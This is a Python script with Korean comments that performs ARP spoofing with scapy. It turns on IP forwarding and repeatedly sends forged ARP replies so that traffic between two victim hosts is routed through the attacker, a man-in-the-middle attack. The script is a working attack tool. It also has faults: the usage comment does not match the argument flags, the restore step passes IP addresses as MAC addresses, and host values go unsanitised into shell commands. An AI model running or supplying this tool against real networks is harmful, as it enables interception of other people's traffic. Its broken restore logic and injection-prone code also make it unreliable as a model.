# sudo python arp_spoof.py -v 192.168.0.3 -r 192.168.0.1

from scapy.all import *
import argparse
import signal
import sys
import logging
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# 파일을 실행할 때 ARP Redirect를 실시할 두 IP를 인자로 받기 위함
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v1", "--victim1IP", help="Choose the victim1 IP address. Example: -v1 192.168.22.2")
    parser.add_argument("-v2", "--victim2IP", help="Choose the victim2 IP address. Example: -v2 192.168.22.3")
    return parser.parse_args()

# 원래의(자신의) MAC 주소 알아내기
def originalMAC(host):
    # WHO_HAS(ARP) request를 보내는 것 (선택)
    os.popen('ping -c 1 %s' % host)
    # 직접 연결하기 위한 설정
    fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
        return fields[3]
    else:
        print('no response from', host)

# ARP를 전달하는 함수. 양쪽에 전달하여 MAC주소를 혼동할 수 있게 함
def poison(victim1IP, victim2IP, victim1MAC, victim2MAC):
    send(ARP(op=2, pdst=victim1IP, psrc=victim2IP, hwdst=victim1MAC))
    send(ARP(op=2, pdst=victim2IP, psrc=victim1IP, hwdst=victim2MAC))

# ff:ff:ff:ff:ff:ff 라는 MAC 주소를 전달하여 다시 각 MAC주소를 회복할 수 있도록 함
def restore(victim1IP, victim2IP, victim1MAC, victim2MAC):
    send(ARP(op=2, pdst=victim1IP, psrc=victim2IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim2IP), count=3)
    send(ARP(op=2, pdst=victim2IP, psrc=victim1IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim1IP), count=3)
    sys.exit("losing...")

def main(args):
    # 관리자 권한으로 실행하지 않는다면 되지 않게
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    
    # IP 와 MAC 에 대한 정보를 출력
    victimIP1 = args.victim1IP
    print('victim1IP : ', victimIP1)
    victimIP2 = args.victim2IP
    print('victimIP2 : ', victimIP2)
    victim1MAC = originalMAC(args.victim1IP)
    print('victim1MAC : ', victim1MAC)
    victim2MAC = originalMAC(args.victim2IP)
    print('victim2MAC : ', victim2MAC)

    # MAC 주소를 얻어내지 못했다면...
    if victim1MAC == None:
        sys.exit("victim1의 MAC address를 불러오지 못했습니다.\nClosing....")
    if victim2MAC == None:
        sys.exit("victim2의 MAC address를 불러오지 못했습니다.\nClosing....")

    # ip 설정
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')

    # Signal 을 설정
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(victimIP1, victimIP2, victim1MAC, victim2MAC)
    signal.signal(signal.SIGINT, signal_handler)

    # 계속 잘못된 ARP를 보내 자신에게 정보가 오게 함
    while 1:
        poison(victimIP1, victimIP2, victim1MAC, victim2MAC)
        time.sleep(1.5)

main(parse_args())